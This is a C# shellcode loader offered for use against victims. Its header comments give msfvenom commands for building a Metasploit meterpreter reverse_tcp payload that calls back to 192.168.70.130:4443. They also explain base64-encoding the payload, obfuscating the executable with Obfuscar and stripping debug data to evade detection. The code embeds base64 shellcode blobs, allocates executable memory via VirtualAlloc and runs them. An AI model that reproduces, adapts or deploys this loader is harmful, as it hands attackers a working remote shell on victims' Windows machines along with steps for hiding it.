//execute payload from c# managed code with help of umenaged kernel32 DLL
//obfuscate .Net executable with Obfuscar nugget package
//you can input payload of your choice (not only metasploit) requirment is to be in format of c# byte array or base64
//example for Metasploit
//step generate payload
//msfvenom - a x64--platform Windows LHOST = 192.168.70.130 LPORT = 4443 - p windows / x64 / meterpreter / reverse_tcp - f csharp
//msfvenom - a x86--platform Windows LHOST = 192.168.70.130 LPORT = 4443 - p windows / meterpreter / reverse_tcp - f csharp
//step convert to base 64
//paste output from msfvenom here and convert to base64 for with below line in debug mode
//string prepare_payload = Convert.ToBase64String(buf);
//copy value of prepare_payload to proper payload variable (payloadB64_x64||payloadB64_x86) in debug mode
//remove msfvenom buf variable and compile to release (remeber to remove PDB information) and comment/remove convert to base64 line
//last step compile in release and execute on victim

using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace meterpreter_form_cs
{
    class Program
    {
        [DllImport("kernel32")]
        
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate void WindowsRun();

        // string prepare_payload = Convert.ToBase64String(payload);
        static void Main(string[] args)
        {
            OperatingSystem os = Environment.OSVersion;
            bool x86 = (IntPtr.Size == 4);
            byte[] payload;
            string payloadB64_x64 = "u/x5t1jaxNl0JPRaK8mxm4PCBDFaEANaEB6MbYpkmsJGTLyXvJhhaXTRCrjQC7B92CjglwMuhyPOsJ/jJbsHg4aBCeDlR6ys6Sy7duAy5h2Y9u3v814pVEz3UCZ4Mq7oMyS2vE5lcjbo+sKIe4FFLmrzCpYe6bwyeXsrn0X5YO6fBzHFgKwkK8e7bii6cRjxRWztBxmZPFv652X6gghmaBpGYKDjOvqHhSVoVkHdzZF+PEx0fyGvXziz90OIqXXB40OkF8LmfpwxiYZnKtsUJ+GDll16OWmb61bxU77UbusXJKdm0Uh9nVAPgTDsHecYk9HmLm0HZuNiSxFSuYCMy2Um3N3pTYSIgjLJWRDGkC6PvWjGlwWfPcBS71fHa3DLjBBJDEcasok5aStNuwb0IMmFsgrgrONkFmeiGqUcrgc2+vlMX7gkIuVfMde1lw34xH+qCJQTJm52O7DTM6qklDXHn1CTEcYYZek75pGSGZw9sI572O9yAC3TION+BMKJSR+B4ZpQn4XvO+rpmVCSDV7rq7R8XcJYR2vfWqWur6kNDhs/EIpirxon0ojGfrQm7/jV727FKNXYR8uonJnJTIDS7TlTayO5kdskTj5CE8PE8JquoySuJbPm32HR8WKkPghlAWw+i113+lWHTXq52TYKQWEXg9uV3AbLCHVdxUiZ+caQfibkc2SPa6uujdPnK1fibG6qP1f47BvSbJrDtiy51FNmyz5/QF523nYh84w4gFJuqknqjBSa8QeijvrpWn35w2yjbNuNiBnKoH6fyp53l/O/YfWP6pMvVgXvw8pTG/Tt8vz6Hvgnqnop47iAadjRpwFyl9qtzVOM766WRiW5hcYP";
            string payloadB64_x86 = "297ZdCT0uu/sQjdeKcmxcTFWGIPGBANW+w636sMWTDE39obwDzoCukX03jhf8i95SvgJkKvQ93+ViE9xvytJ0/oLsofcKXL6wiolIud5D4edQjrFPSst+64VoFYJMyXaZTeifvGaMFqsyK7R0Aw0nA8GKtbLZrEFU+UQY/3es2BHhWnmu5YNu70/iLYLRNUjEILoP1pHgCkQEDDKsz1z20PibDZk5w/wCrAvbgTiIww9oGeKJcfe8waV39A0GQRkBX5kQDJA5Pa4L3v51U5Xxz4VuxBQa6PoFR3fIh7JO2k+7XywrWLfzTYDhULcc3GtdHei3L3NigFc04dmfU7qiWQIJi/z2rgMKUipMyLsiubJnxH92ugj33RdfzRxLia5Ye0YbE4j2DEUD1hjKcVa+h5gNmHZpfJNVaWoovS2nCXA5/b7EdgjMgkMwNs7pT1WusXAq8Pis2woBnLgz0at+GJrhK2a+GmQe1mTv3628F54G2tNLKL9HkxFvpxb4m7y4ZGI8xGsPasDOOYg14rcmC6Cyv6mmkzvBkSY5NPvtH6G2HRKKENTV7Y1D6ht7eJMUtNc6Uo8rafvCPMmEFkuKdw/RToD1l8be3nvJv9m9QgyDnpnCjW1mO724Kg=";

            //paste buf from msfvenom here
            
            //string prepare_payload = Convert.ToBase64String(buf);


            if (os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT)
            {

                if (!x86) 
                {
                    payload = Convert.FromBase64String(payloadB64_x64);                                        
                }
                else
                {
                    payload = Convert.FromBase64String(payloadB64_x86);
                    
                }

                IntPtr ptr = VirtualAlloc(IntPtr.Zero, (IntPtr)payload.Length, (IntPtr)0x1000, (IntPtr)0x40);
                Marshal.Copy(payload, 0, ptr, payload.Length);
                WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer(ptr, typeof(WindowsRun));
                r();
            }
        }
    }
}
